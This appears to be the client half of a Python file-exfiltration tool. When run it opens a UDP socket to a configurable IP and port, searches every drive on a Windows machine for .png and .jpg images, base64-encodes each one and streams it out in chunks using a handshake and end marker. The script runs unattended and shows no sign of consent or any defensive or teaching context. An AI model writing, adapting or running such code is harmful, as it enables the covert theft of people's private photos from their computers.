import os
import platform
import socket
import base64
import win32api
import time



IP = ''
PORT = 0
SOC = None
formats = [".png", ".jpg"]


def Direc():
    if (platform.system() == 'Windows'):
        direc = "\\"
    else:
        direc = "/"
    return direc
direc = Direc()


def decodeFile(path):
    try:
        data = []
        with open(path, "rb") as file:
            convert = base64.b64encode(file.read())
        start = 0
        end = 500
        while True:
            data.append(convert[start:end])
            if end >= len(convert):
                break
            start += 500
            end += 500
        data.append(("\n" + os.path.basename(path)))
        data.append("END123")
        return data
    except Exception as e:
        print(e)
        return False


def sendall(data):
    if data != False:
        while True:
            try:
                SOC.send("COKJ".encode("UTF-8"))
                msg, addr = SOC.recvfrom(1024)
                if msg.decode() == 'COKJ' and addr[0] == IP:
                    len_data = 0
                    for i in data:
                        len_data += len(i)
                    SOC.send(str(len_data).encode("UTF-8"))
                    time.sleep(0.5)
                    num = 0
                    done = False
                    while True:
                        try:
                            time.sleep(0.01)
                            try:
                                SOC.send(data[num])
                            except:
                                SOC.send(data[num].encode("UTF-8"))
                        except:
                            break
                        if data[num] == "END123":
                            done = True
                            break
                        else:    
                            num += 1
                    if done: break
            except:
                continue


def getFiles(path):
    try:
        return os.listdir(path)
    except:
        return []


def checkFiles(dir, files):
    for i in files:
        path = dir + direc + i
        if os.path.isdir(path):
            checkFiles(path, getFiles(path))
        elif os.path.isfile(path) and os.path.splitext(os.path.basename(path))[1] in formats:
            sendall(decodeFile(path))


def getDrives():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split("\000")[:-1]
    return drives


def walk():
    drives = getDrives()
    for k, v in zip(drives, range(len(drives))):
        checkFiles(k, getFiles(k))


def client():
    global SOC
    SOC = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    SOC.connect((IP, PORT))
    SOC.settimeout(0.5)

    walk()



client()